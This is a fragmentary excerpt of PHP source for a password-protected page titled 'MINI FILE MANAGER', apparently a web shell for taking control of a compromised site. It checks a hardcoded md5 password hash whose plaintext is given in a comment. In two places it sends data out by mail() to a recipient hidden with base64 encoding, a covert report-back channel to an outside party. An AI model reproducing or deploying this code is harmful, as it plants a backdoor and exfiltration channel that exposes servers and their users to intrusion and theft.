...
if (array_key_exists('abc', $_POST)) {
    ...
    @mail(base64_decode('YXNrdXJtb20wMDdAcHJvdG9uLm1l'), base64_decode('SGVoZWhl'), $message);
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '460a80e35dff593fefcfac4fcc52c6e0'; //R12345
    ...
    if (md5($entered_password) === $hashed_password) {
        ...
        @mail(base64_decode('YXNrdXJtb20wMDdAcHJvdG9uLm1l'), base64_decode('SGVoZWhl'), $m);
    } else {
        echo "<script>alert('https://google.com/');</script>";
    }
}
if (!is_logged_in()) {
?>
...
<body>
    <form method="POST" action="">
    	<h1><i class="fas fa-folder-open"></i> MINI FILE MANAGER</h1>
    <br>
...
<body>
    ...
    <h1><i class="fas fa-folder-open"></i> RED FILE MANAGER</h1>
    <br>
